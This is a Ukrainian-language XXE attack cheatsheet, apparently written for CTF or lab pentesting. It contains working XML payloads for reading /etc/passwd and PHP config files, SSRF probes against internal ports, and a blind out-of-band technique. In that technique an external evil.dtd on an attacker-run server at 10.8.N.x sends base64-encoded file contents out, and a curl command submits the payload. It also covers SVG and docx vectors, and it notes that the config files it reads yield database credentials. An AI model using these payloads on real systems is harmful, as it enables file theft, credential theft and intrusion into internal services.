# Cheatsheet: XXE (XML External Entity)

Додаток парсить XML від користувача → читання локальних файлів, SSRF до внутрішніх сервісів, інколи RCE.
Типові місця: `Content-Type: application/xml`, SOAP, SAML, завантаження `.xml`/`.docx`/`.svg`, API, що приймає XML.
← [web-enum](../02-workflows/web-enum.md) · [web-vulns](../04-techniques/web-vulns-overview.md) · SSRF-ціль: [pivoting](../02-workflows/pivoting-portforward.md)

## 1. Підтвердження + читання файлу (in-band)
Якщо відповідь десь відображає надіслане значення — класичний варіант:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
```
Надіслати на вразливий ендпоінт:
```bash
curl -s "http://$TARGET/api" -H 'Content-Type: application/xml' --data-binary @payload.xml
```
Вміст `/etc/passwd` у відповіді → XXE підтверджено. Далі — цінні файли як у [LFI](lfi-traversal.md#цінні-файли-linux).

## 2. Обхід «зіпсованого» виводу (PHP base64-wrapper)
Файли з `<`, `&` ламають XML-парсинг → читати через base64:
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<root><name>&xxe;</name></root>
```
Відповідь → `echo '<b64>' | base64 -d`.

## 3. SSRF через XXE (внутрішні сервіси/метадані)
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<root><name>&xxe;</name></root>
```
Перебір внутрішніх портів зміною URL; поєднувати з [pivoting](../02-workflows/pivoting-portforward.md).

## 4. Blind / OOB (немає виводу у відповіді) <a id="oob"></a>
Витягнути дані на свій HTTP через зовнішній DTD. Локально підняти `python3 -m http.server 8000` на `10.8.N.x`.

`evil.dtd` (на своєму сервері):
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.8.N.x:8000/?x=%file;'>">
%eval; %exfil;
```
Пейлоад на ціль:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://10.8.N.x:8000/evil.dtd"> %dtd; ]>
<root>1</root>
```
Параметр `?x=` у лозі `http.server` = base64 вмісту файлу. Підтвердження самого blind-XXE без читання: SYSTEM-запит на свій сервер (видно звернення в лозі).

## 5. Інші вектори
- **SVG upload:** файл-аватар `.svg` з `<!DOCTYPE>` та `&xxe;` всередині `<text>` — парситься при генерації прев'ю.
- **Office/`.docx`:** це zip; XXE у `word/document.xml` або `[Content_Types].xml`.
- **`Content-Type: application/json` → спробувати перемкнути на `application/xml`** (той самий ендпоінт інколи приймає обидва).
- **Billion laughs / DoS — НЕ застосовувати** (правила: без DoS).

## Пастки / читання
- Парсер мовчить, але є затримка/помилка SSL → SYSTEM відпрацьовує, іде blind-шлях (п.4).
- `&xxe;` екранується у відповіді дослівно → парсер не читає зовнішні сутності або зіпсований вивід → base64-wrapper / OOB.
- Читані конфіги → БД-креди (→ [databases](databases.md), [credentials-reuse](../04-techniques/credentials-reuse.md)); у файлах часто прапорці (`grep` за [flag regex](grep-find.md)).
